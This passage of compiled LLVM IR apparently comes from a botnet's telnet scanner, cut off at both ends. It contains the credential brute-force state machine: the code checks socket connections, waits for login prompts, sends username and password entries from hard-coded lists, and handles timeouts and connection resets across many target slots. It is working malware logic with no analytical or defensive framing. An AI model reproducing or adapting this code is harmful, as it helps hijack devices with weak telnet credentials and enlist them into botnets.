; <label>:241:                                    ; preds = %234
  %242 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %243 = load i32, i32* %4, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %244
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %245, i32 0, i32 6
  store i32 %242, i32* %246, align 4
  br label %247

; <label>:247:                                    ; preds = %241, %234
  br label %248

; <label>:248:                                    ; preds = %247
  %249 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i32 0, i32 0
  %250 = getelementptr inbounds [16 x i64], [16 x i64]* %249, i64 0, i64 0
  %251 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %250) #2, !srcloc !5
  %252 = extractvalue { i64, i64* } %251, 0
  %253 = extractvalue { i64, i64* } %251, 1
  %254 = trunc i64 %252 to i32
  store i32 %254, i32* %14, align 4
  %255 = ptrtoint i64* %253 to i64
  %256 = trunc i64 %255 to i32
  store i32 %256, i32* %15, align 4
  br label %257

; <label>:257:                                    ; preds = %248
  br label %258

; <label>:258:                                    ; preds = %257
  %259 = load i32, i32* %4, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %260
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %261, i32 0, i32 0
  %263 = load i32, i32* %262, align 16
  %264 = srem i32 %263, 64
  %265 = zext i32 %264 to i64
  %266 = shl i64 1, %265
  %267 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i32 0, i32 0
  %268 = load i32, i32* %4, align 4
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %269
  %271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %270, i32 0, i32 0
  %272 = load i32, i32* %271, align 16
  %273 = sdiv i32 %272, 64
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds [16 x i64], [16 x i64]* %267, i64 0, i64 %274
  %276 = load i64, i64* %275, align 8
  %277 = or i64 %276, %266
  store i64 %277, i64* %275, align 8
  %278 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i32 0, i32 0
  store i64 0, i64* %278, align 8
  %279 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i32 0, i32 1
  store i64 10000, i64* %279, align 8
  %280 = load i32, i32* %4, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %281
  %283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %282, i32 0, i32 0
  %284 = load i32, i32* %283, align 16
  %285 = add nsw i32 %284, 1
  %286 = call i32 @select(i32 %285, %struct.__sigset_t* null, %struct.__sigset_t* %6, %struct.__sigset_t* null, %struct.timeval* %7)
  store i32 %286, i32* %5, align 4
  %287 = load i32, i32* %5, align 4
  %288 = icmp eq i32 %287, 1
  br i1 %288, label %289, label %346

; <label>:289:                                    ; preds = %258
  store i32 4, i32* %8, align 4
  store i32 0, i32* %9, align 4
  %290 = load i32, i32* %4, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %291
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %292, i32 0, i32 0
  %294 = load i32, i32* %293, align 16
  %295 = bitcast i32* %9 to i8*
  %296 = call i32 @getsockopt(i32 %294, i32 1, i32 4, i8* %295, i32* %8) #2
  %297 = load i32, i32* %9, align 4
  %298 = icmp ne i32 %297, 0
  br i1 %298, label %299, label %314

; <label>:299:                                    ; preds = %289
  %300 = load i32, i32* %4, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %301
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %302, i32 0, i32 0
  %304 = load i32, i32* %303, align 16
  %305 = call i32 @sclose(i32 %304)
  %306 = load i32, i32* %4, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %307
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %308, i32 0, i32 2
  store i8 0, i8* %309, align 8
  %310 = load i32, i32* %4, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %311
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %312, i32 0, i32 3
  store i8 1, i8* %313, align 1
  br label %345

; <label>:314:                                    ; preds = %289
  %315 = load i32, i32* %4, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %316
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %317, i32 0, i32 0
  %319 = load i32, i32* %318, align 16
  %320 = load i32, i32* %4, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %321
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %322, i32 0, i32 0
  %324 = load i32, i32* %323, align 16
  %325 = call i32 (i32, i32, ...) @fcntl(i32 %324, i32 3, i8* null)
  %326 = and i32 %325, -2049
  %327 = call i32 (i32, i32, ...) @fcntl(i32 %319, i32 4, i32 %326)
  %328 = load i32, i32* %4, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %329
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %330, i32 0, i32 6
  store i32 0, i32* %331, align 4
  %332 = load i32, i32* %4, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %333
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %334, i32 0, i32 7
  store i16 0, i16* %335, align 16
  %336 = load i32, i32* %4, align 4
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %337
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %338, i32 0, i32 8
  %340 = load i8*, i8** %339, align 8
  call void @llvm.memset.p0i8.i64(i8* %340, i8 0, i64 1024, i32 1, i1 false)
  %341 = load i32, i32* %4, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %342
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %343, i32 0, i32 2
  store i8 2, i8* %344, align 8
  br label %1172

; <label>:345:                                    ; preds = %299
  br label %365

; <label>:346:                                    ; preds = %258
  %347 = load i32, i32* %5, align 4
  %348 = icmp eq i32 %347, -1
  br i1 %348, label %349, label %364

; <label>:349:                                    ; preds = %346
  %350 = load i32, i32* %4, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %351
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %352, i32 0, i32 0
  %354 = load i32, i32* %353, align 16
  %355 = call i32 @sclose(i32 %354)
  %356 = load i32, i32* %4, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %357
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %358, i32 0, i32 2
  store i8 0, i8* %359, align 8
  %360 = load i32, i32* %4, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %361
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %362, i32 0, i32 3
  store i8 1, i8* %363, align 1
  br label %364

; <label>:364:                                    ; preds = %349, %346
  br label %365

; <label>:365:                                    ; preds = %364, %345
  %366 = load i32, i32* %4, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %367
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %368, i32 0, i32 6
  %370 = load i32, i32* %369, align 4
  %371 = add i32 %370, 5
  %372 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %373 = icmp ult i32 %371, %372
  br i1 %373, label %374, label %389

; <label>:374:                                    ; preds = %365
  %375 = load i32, i32* %4, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %376
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %377, i32 0, i32 0
  %379 = load i32, i32* %378, align 16
  %380 = call i32 @sclose(i32 %379)
  %381 = load i32, i32* %4, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %382
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %383, i32 0, i32 2
  store i8 0, i8* %384, align 8
  %385 = load i32, i32* %4, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %386
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %387, i32 0, i32 3
  store i8 1, i8* %388, align 1
  br label %389

; <label>:389:                                    ; preds = %374, %365
  br label %1171

; <label>:390:                                    ; preds = %70
  %391 = load i32, i32* %4, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %392
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %393, i32 0, i32 6
  %395 = load i32, i32* %394, align 4
  %396 = icmp eq i32 %395, 0
  br i1 %396, label %397, label %403

; <label>:397:                                    ; preds = %390
  %398 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %399 = load i32, i32* %4, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %400
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %401, i32 0, i32 6
  store i32 %398, i32* %402, align 4
  br label %403

; <label>:403:                                    ; preds = %397, %390
  %404 = load i32, i32* %4, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %405
  %407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %406, i32 0, i32 0
  %408 = load i32, i32* %407, align 16
  %409 = load i32, i32* %4, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %410
  %412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %411, i32 0, i32 8
  %413 = load i8*, i8** %412, align 8
  %414 = load i32, i32* %4, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %415
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %416, i32 0, i32 7
  %418 = load i16, i16* %417, align 16
  %419 = zext i16 %418 to i32
  %420 = call i32 @readUntil(i32 %408, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %413, i32 1024, i32 %419)
  %421 = icmp ne i32 %420, 0
  br i1 %421, label %422, label %440

; <label>:422:                                    ; preds = %403
  %423 = load i32, i32* %4, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %424
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %425, i32 0, i32 6
  store i32 0, i32* %426, align 4
  %427 = load i32, i32* %4, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %428
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %429, i32 0, i32 7
  store i16 0, i16* %430, align 16
  %431 = load i32, i32* %4, align 4
  %432 = sext i32 %431 to i64
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %432
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %433, i32 0, i32 8
  %435 = load i8*, i8** %434, align 8
  call void @llvm.memset.p0i8.i64(i8* %435, i8 0, i64 1024, i32 1, i1 false)
  %436 = load i32, i32* %4, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %437
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %438, i32 0, i32 2
  store i8 3, i8* %439, align 8
  br label %1172

; <label>:440:                                    ; preds = %403
  %441 = load i32, i32* %4, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %442
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %443, i32 0, i32 8
  %445 = load i8*, i8** %444, align 8
  %446 = call i64 @strlen(i8* %445) #10
  %447 = trunc i64 %446 to i16
  %448 = load i32, i32* %4, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %449
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %450, i32 0, i32 7
  store i16 %447, i16* %451, align 16
  br label %452

; <label>:452:                                    ; preds = %440
  %453 = load i32, i32* %4, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %454
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %455, i32 0, i32 6
  %457 = load i32, i32* %456, align 4
  %458 = add i32 %457, 30
  %459 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %460 = icmp ult i32 %458, %459
  br i1 %460, label %461, label %476

; <label>:461:                                    ; preds = %452
  %462 = load i32, i32* %4, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %463
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %464, i32 0, i32 0
  %466 = load i32, i32* %465, align 16
  %467 = call i32 @sclose(i32 %466)
  %468 = load i32, i32* %4, align 4
  %469 = sext i32 %468 to i64
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %469
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %470, i32 0, i32 2
  store i8 0, i8* %471, align 8
  %472 = load i32, i32* %4, align 4
  %473 = sext i32 %472 to i64
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %473
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %474, i32 0, i32 3
  store i8 1, i8* %475, align 1
  br label %476

; <label>:476:                                    ; preds = %461, %452
  br label %1171

; <label>:477:                                    ; preds = %70
  %478 = load i32, i32* %4, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %479
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %480, i32 0, i32 0
  %482 = load i32, i32* %481, align 16
  %483 = load i32, i32* %4, align 4
  %484 = sext i32 %483 to i64
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %484
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %485, i32 0, i32 4
  %487 = load i8, i8* %486, align 2
  %488 = zext i8 %487 to i64
  %489 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %488
  %490 = load i8*, i8** %489, align 8
  %491 = load i32, i32* %4, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %492
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %493, i32 0, i32 4
  %495 = load i8, i8* %494, align 2
  %496 = zext i8 %495 to i64
  %497 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %496
  %498 = load i8*, i8** %497, align 8
  %499 = call i64 @strlen(i8* %498) #10
  %500 = call i64 @send(i32 %482, i8* %490, i64 %499, i32 16384)
  %501 = icmp slt i64 %500, 0
  br i1 %501, label %502, label %517

; <label>:502:                                    ; preds = %477
  %503 = load i32, i32* %4, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %504
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %505, i32 0, i32 0
  %507 = load i32, i32* %506, align 16
  %508 = call i32 @sclose(i32 %507)
  %509 = load i32, i32* %4, align 4
  %510 = sext i32 %509 to i64
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %510
  %512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %511, i32 0, i32 2
  store i8 0, i8* %512, align 8
  %513 = load i32, i32* %4, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %514
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %515, i32 0, i32 3
  store i8 1, i8* %516, align 1
  br label %1172

; <label>:517:                                    ; preds = %477
  %518 = load i32, i32* %4, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %519
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %520, i32 0, i32 0
  %522 = load i32, i32* %521, align 16
  %523 = call i64 @send(i32 %522, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.26, i32 0, i32 0), i64 2, i32 16384)
  %524 = icmp slt i64 %523, 0
  br i1 %524, label %525, label %540

; <label>:525:                                    ; preds = %517
  %526 = load i32, i32* %4, align 4
  %527 = sext i32 %526 to i64
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %527
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %528, i32 0, i32 0
  %530 = load i32, i32* %529, align 16
  %531 = call i32 @sclose(i32 %530)
  %532 = load i32, i32* %4, align 4
  %533 = sext i32 %532 to i64
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %533
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %534, i32 0, i32 2
  store i8 0, i8* %535, align 8
  %536 = load i32, i32* %4, align 4
  %537 = sext i32 %536 to i64
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %537
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %538, i32 0, i32 3
  store i8 1, i8* %539, align 1
  br label %1172

; <label>:540:                                    ; preds = %517
  %541 = load i32, i32* %4, align 4
  %542 = sext i32 %541 to i64
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %542
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %543, i32 0, i32 2
  store i8 4, i8* %544, align 8
  br label %1171

; <label>:545:                                    ; preds = %70
  %546 = load i32, i32* %4, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %547
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %548, i32 0, i32 6
  %550 = load i32, i32* %549, align 4
  %551 = icmp eq i32 %550, 0
  br i1 %551, label %552, label %558

; <label>:552:                                    ; preds = %545
  %553 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %554 = load i32, i32* %4, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %555
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %556, i32 0, i32 6
  store i32 %553, i32* %557, align 4
  br label %558

; <label>:558:                                    ; preds = %552, %545
  %559 = load i32, i32* %4, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %560
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %561, i32 0, i32 0
  %563 = load i32, i32* %562, align 16
  %564 = load i32, i32* %4, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %565
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %566, i32 0, i32 8
  %568 = load i8*, i8** %567, align 8
  %569 = load i32, i32* %4, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %570
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %571, i32 0, i32 7
  %573 = load i16, i16* %572, align 16
  %574 = zext i16 %573 to i32
  %575 = call i32 @readUntil(i32 %563, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %568, i32 1024, i32 %574)
  %576 = icmp ne i32 %575, 0
  br i1 %576, label %577, label %609

; <label>:577:                                    ; preds = %558
  %578 = load i32, i32* %4, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %579
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %580, i32 0, i32 6
  store i32 0, i32* %581, align 4
  %582 = load i32, i32* %4, align 4
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %583
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %584, i32 0, i32 7
  store i16 0, i16* %585, align 16
  %586 = load i32, i32* %4, align 4
  %587 = sext i32 %586 to i64
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %587
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %588, i32 0, i32 8
  %590 = load i8*, i8** %589, align 8
  %591 = call i8* @strstr(i8* %590, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i32 0, i32 0)) #10
  %592 = icmp ne i8* %591, null
  br i1 %592, label %593, label %598

; <label>:593:                                    ; preds = %577
  %594 = load i32, i32* %4, align 4
  %595 = sext i32 %594 to i64
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %595
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %596, i32 0, i32 2
  store i8 5, i8* %597, align 8
  br label %603

; <label>:598:                                    ; preds = %577
  %599 = load i32, i32* %4, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %600
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %601, i32 0, i32 2
  store i8 100, i8* %602, align 8
  br label %603

; <label>:603:                                    ; preds = %598, %593
  %604 = load i32, i32* %4, align 4
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %605
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %606, i32 0, i32 8
  %608 = load i8*, i8** %607, align 8
  call void @llvm.memset.p0i8.i64(i8* %608, i8 0, i64 1024, i32 1, i1 false)
  br label %1172

; <label>:609:                                    ; preds = %558
  %610 = load i32, i32* %4, align 4
  %611 = sext i32 %610 to i64
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %611
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %612, i32 0, i32 8
  %614 = load i8*, i8** %613, align 8
  %615 = call i8* @strstr(i8* %614, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0)) #10
  %616 = icmp ne i8* %615, null
  br i1 %616, label %617, label %632

; <label>:617:                                    ; preds = %609
  %618 = load i32, i32* %4, align 4
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %619
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %620, i32 0, i32 0
  %622 = load i32, i32* %621, align 16
  %623 = call i32 @sclose(i32 %622)
  %624 = load i32, i32* %4, align 4
  %625 = sext i32 %624 to i64
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %625
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %626, i32 0, i32 2
  store i8 0, i8* %627, align 8
  %628 = load i32, i32* %4, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %629
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %630, i32 0, i32 3
  store i8 0, i8* %631, align 1
  br label %1172

; <label>:632:                                    ; preds = %609
  %633 = load i32, i32* %4, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %634
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %635, i32 0, i32 8
  %637 = load i8*, i8** %636, align 8
  %638 = call i64 @strlen(i8* %637) #10
  %639 = trunc i64 %638 to i16
  %640 = load i32, i32* %4, align 4
  %641 = sext i32 %640 to i64
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %641
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %642, i32 0, i32 7
  store i16 %639, i16* %643, align 16
  br label %644

; <label>:644:                                    ; preds = %632
  %645 = load i32, i32* %4, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %646
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %647, i32 0, i32 6
  %649 = load i32, i32* %648, align 4
  %650 = add i32 %649, 8
  %651 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %652 = icmp ult i32 %650, %651
  br i1 %652, label %653, label %668

; <label>:653:                                    ; preds = %644
  %654 = load i32, i32* %4, align 4
  %655 = sext i32 %654 to i64
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %655
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %656, i32 0, i32 0
  %658 = load i32, i32* %657, align 16
  %659 = call i32 @sclose(i32 %658)
  %660 = load i32, i32* %4, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %661
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %662, i32 0, i32 2
  store i8 0, i8* %663, align 8
  %664 = load i32, i32* %4, align 4
  %665 = sext i32 %664 to i64
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %665
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %666, i32 0, i32 3
  store i8 1, i8* %667, align 1
  br label %668

; <label>:668:                                    ; preds = %653, %644
  br label %1171

; <label>:669:                                    ; preds = %70
  %670 = load i32, i32* %4, align 4
  %671 = sext i32 %670 to i64
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %671
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %672, i32 0, i32 0
  %674 = load i32, i32* %673, align 16
  %675 = load i32, i32* %4, align 4
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %676
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %677, i32 0, i32 5
  %679 = load i8, i8* %678, align 1
  %680 = zext i8 %679 to i64
  %681 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %680
  %682 = load i8*, i8** %681, align 8
  %683 = load i32, i32* %4, align 4
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %684
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %685, i32 0, i32 5
  %687 = load i8, i8* %686, align 1
  %688 = zext i8 %687 to i64
  %689 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %688
  %690 = load i8*, i8** %689, align 8
  %691 = call i64 @strlen(i8* %690) #10
  %692 = call i64 @send(i32 %674, i8* %682, i64 %691, i32 16384)
  %693 = icmp slt i64 %692, 0
  br i1 %693, label %694, label %709

; <label>:694:                                    ; preds = %669
  %695 = load i32, i32* %4, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %696
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %697, i32 0, i32 0
  %699 = load i32, i32* %698, align 16
  %700 = call i32 @sclose(i32 %699)
  %701 = load i32, i32* %4, align 4
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %702
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %703, i32 0, i32 2
  store i8 0, i8* %704, align 8
  %705 = load i32, i32* %4, align 4
  %706 = sext i32 %705 to i64
  %707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %706
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %707, i32 0, i32 3
  store i8 1, i8* %708, align 1
  br label %1172

; <label>:709:                                    ; preds = %669
  %710 = load i32, i32* %4, align 4
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %711
